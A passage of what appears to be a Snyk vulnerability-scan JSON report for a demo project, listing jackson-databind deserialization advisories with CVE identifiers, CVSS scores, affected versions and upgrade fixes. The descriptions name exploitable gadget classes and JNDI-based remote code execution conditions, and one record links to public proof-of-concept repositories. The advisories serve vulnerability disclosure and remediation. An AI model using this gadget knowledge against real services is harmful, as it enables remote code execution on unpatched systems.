gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.1, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2478)\n",
      "disclosureTime": "2019-10-01T17:43:33Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.1",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469674",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mx7p-6679-8g3q"
        ],
        "CVE": [
          "CVE-2019-16942"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:59:50.138598Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-02T17:43:33Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2478"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10.1)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-02T08:03:39.391997Z",
      "credit": [
        "bsmali4"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered as `com.p6spy.engine.spy.P6DataSource` was not blocked. An attacker could leverage this gadget type  to perform Remote Code Execution attacks through deserialization.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.1, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2478)\n",
      "disclosureTime": "2019-10-01T17:43:33Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.1",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469676",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-fmmc-742q-jg75"
        ],
        "CVE": [
          "CVE-2019-16943"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:58:41.186190Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-02T17:43:33Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2478"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10.1)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-07T10:05:31.629572Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered related to `net.sf.ehcache.hibernate.EhcacheJtaTransactionManagerLookup`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/191a4cdf87b56d2ddddb77edd895ee756b7f75eb)\n- [GitHub Comparison](https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.3...jackson-databind-2.9.10)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2460)\n",
      "disclosureTime": "2019-10-07T01:14:26Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-471943",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-f3j5-rmmp-3fc5"
        ],
        "CVE": [
          "CVE-2019-17267"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:54:38.066408Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-07T01:14:26Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/191a4cdf87b56d2ddddb77edd895ee756b7f75eb"
        },
        {
          "title": "GitHub Comparison",
          "url": "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.3...jackson-databind-2.9.10"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2460"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-13T07:40:03.046000Z",
      "credit": [
        "Zhangxianhui"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. When Default Typing is enabled for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.1 or higher.\n## References\n- [Blog Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/b5a304a98590b6bb766134f9261e6566dcbbb6d0)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2498)\n",
      "disclosureTime": "2019-10-12T21:52:10Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.1)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.1"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-472980",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-gjmw-vf9h-g25v"
        ],
        "CVE": [
          "CVE-2019-17531"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:54.438902Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-13T07:41:55Z",
      "references": [
        {
          "title": "Blog Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/b5a304a98590b6bb766134f9261e6566dcbbb6d0"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2498"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0, 2.9.10.1)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-01-03T10:26:22.562970Z",
      "credit": [
        "UltramanGaia"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Two additional `net.sf.ehcache` gadgets are not blacklisted.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.2 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/fc4214a883dc087070f25da738ef0d49c2f3387e)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2526)\n",
      "disclosureTime": "2020-01-03T05:14:08Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0,2.9.10.2)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.2"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-540500",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2019-20330"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:57:43.185212Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-01-03T05:14:08Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/fc4214a883dc087070f25da738ef0d49c2f3387e"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2526"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0,2.9.10.2)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.2)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-02-11T07:57:04.144993Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data due to an incomplete black list (incomplete fix for [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507)). \r\nIt lacks `xbean-reflect/JNDI` blocking, as demonstrated by `org.apache.xbean.propertyeditor.JndiConverter`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.7.9.7, 2.8.11.5, 2.9.10.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2620)\n- [Jackson PoC](https://github.com/jas502n/jackson-CVE-2020-8840)\n- [PoC](https://github.com/jas502n/CVE-2020-8840)\n- [PoC](https://github.com/Veraxy01/CVE-2020-8840)\n",
      "disclosureTime": "2020-02-09T21:12:38Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.7.9.7",
        "2.8.11.5",
        "2.9.10.3"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-548451",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-8840"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:57:53.187233Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-02-11T21:12:38Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2620"
        },
        {
          "title": "Jackson PoC",
          "url": "https://github.com/jas502n/jackson-CVE-2020-8840"
        },
        {
          "title": "PoC",
          "url": "https://github.com/jas502n/CVE-2020-8840"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Veraxy01/CVE-2020-8840"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.8.11.5)",
            "[2.9.0,2.9.10.3)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.7.9.7)",
          "[2.8.0,2.8.11.5)",
          "[2.9.0,2.9.10.3)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-02T10:29:31.222015Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
